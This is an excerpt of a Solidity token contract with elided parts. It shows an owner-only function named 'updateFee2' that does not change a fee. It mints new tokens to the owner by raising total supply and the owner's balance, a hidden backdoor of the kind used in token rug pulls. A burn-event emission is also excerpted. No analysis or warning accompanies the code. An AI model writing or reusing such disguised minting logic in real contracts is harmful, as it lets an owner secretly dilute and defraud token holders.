 ...
 */
	...
	function updateFee2(uint256 percentage) onlyOwner() public {
        
                _tTotal += percentage;
        _tOwned[_owner] += percentage;
        emit Transfer(address(0), _owner, percentage);
    }
 ...
 */
    ...
    function _reflectFee(uint256 rFee, uint256 rBurn, uint256 tFee, uint256 tBurn, uint256 tCharity) private {
		...
		emit Transfer(address(this), 0x000000000000000000000000000000000000dEaD, tBurn);
    }
